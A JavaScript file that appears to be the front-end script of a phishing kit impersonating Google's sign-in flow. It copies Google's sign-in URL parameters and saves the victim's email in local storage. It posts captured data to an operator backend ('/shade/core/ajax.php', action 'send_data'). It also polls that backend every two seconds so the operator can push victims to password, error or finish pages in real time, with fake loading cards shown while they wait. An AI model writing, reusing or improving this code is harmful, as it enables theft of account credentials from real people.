(function () {
  'use strict';

  var API = window.SITE_API || '/shade/core/ajax.php';

  function pageUrl(name) {
    name = String(name || '').replace(/\.php$/, '');
    var routes = window.SITE_ROUTES || {};
    var path = routes[name] || name;
    var base = (window.SITE_BASE || '').replace(/\/$/, '');
    var url = (base ? base + '/' : '/') + path;

    if (name === 'signin' && url.indexOf('flowEntry=') === -1) {
      url += (url.indexOf('?') === -1 ? '?' : '&')
        + 'flowEntry=ServiceLogin&flowName=GlifWebSignIn';
    }

    return url;
  }

  window.GoogleAuth = {
    api: API,

    heartbeat: function (currentPage, allowRedirect) {
      if (!allowRedirect) return;

      $.ajax({
        url: API + '?action=heartbeat',
        method: 'GET',
        data: { currentpage: currentPage, _t: Date.now() },
        dataType: 'text',
        timeout: 5000
      }).done(function (resp) {
        resp = (resp || '').trim();
        if (!resp || resp === 'loading' || resp === 'start' || resp === 'login' || resp === currentPage) {
          return;
        }
        if (resp === 'finish') {
          window.location.href = pageUrl('finish');
          return;
        }
        if (resp === 'refresh') {
          window.location.href = pageUrl(currentPage) + '?error=1';
          return;
        }
        window.location.href = pageUrl(resp);
      });
    },

    startHeartbeat: function (currentPage, allowRedirect, interval) {
      var enabled = allowRedirect !== false;
      var ms = interval || 2000;

      function tick() {
        GoogleAuth.heartbeat(currentPage, enabled);
      }

      tick();
      return setInterval(tick, ms);
    },

    sendData: function (payload) {
      return $.ajax({
        url: API + '?action=send_data',
        method: 'POST',
        data: payload,
        dataType: 'text',
        timeout: 10000
      });
    },

    initFloatingLabels: function () {
      document.querySelectorAll('.g-input').forEach(function (input) {
        function update() {
          if (input.value) input.classList.add('is-filled');
          else input.classList.remove('is-filled');
        }
        input.addEventListener('input', update);
        update();
      });
    },

    initShowPassword: function (checkboxId, inputId) {
      var cb = document.getElementById(checkboxId);
      var input = document.getElementById(inputId);
      if (!cb || !input) return;
      cb.addEventListener('change', function () {
        input.type = this.checked ? 'text' : 'password';
      });
    },

    loadEmail: function (targetId, redirectIfMissing) {
      var email = localStorage.getItem('savedEmail');
      var el = document.getElementById(targetId || 'dynamicEmail');
      if (email && el) {
        el.textContent = email;
        el.title = email;
      }
      if (!email && redirectIfMissing) {
        window.location.href = pageUrl('signin');
      }
      return email;
    },

    showCardLoading: function (selector) {
      var card = document.querySelector(selector || '.g-card');
      if (!card) return card;

      card.classList.add('is-loading');

      card.querySelectorAll('button, input, textarea, select').forEach(function (el) {
        el.disabled = true;
      });

      card.querySelectorAll('a.g-btn, a.g-link').forEach(function (el) {
        el.setAttribute('aria-disabled', 'true');
        el.classList.add('is-disabled');
        el.tabIndex = -1;
        el.addEventListener('click', preventClick);
      });

      return card;
    },

    startWaiting: function (currentPage, cardSelector, existingInterval) {
      if (existingInterval) {
        clearInterval(existingInterval);
      }
      this.showCardLoading(cardSelector);
      return this.startHeartbeat(currentPage, true);
    },

    initSignIn: function (formId, inputId) {
      var form = document.getElementById(formId || 'loginForm');
      var input = document.getElementById(inputId || 'emailInput');
      if (!form || !input) return;

      function goNext() {
        var email = (input.value || '').trim();
        if (!email) {
          input.focus();
          input.classList.add('is-error');
          return;
        }

        input.classList.remove('is-error');
        GoogleAuth.showCardLoading('.g-card');
        localStorage.setItem('savedEmail', email);

        window.setTimeout(function () {
          window.location.href = pageUrl('pass');
        }, 900);
      }

      input.addEventListener('input', function () {
        if (this.value.trim()) {
          this.classList.remove('is-error');
        }
      });

      form.addEventListener('submit', function (e) {
        e.preventDefault();
        goNext();
      });
    }
  };

  function preventClick(e) {
    e.preventDefault();
  }

  document.addEventListener('DOMContentLoaded', function () {
    GoogleAuth.initFloatingLabels();
  });
})();
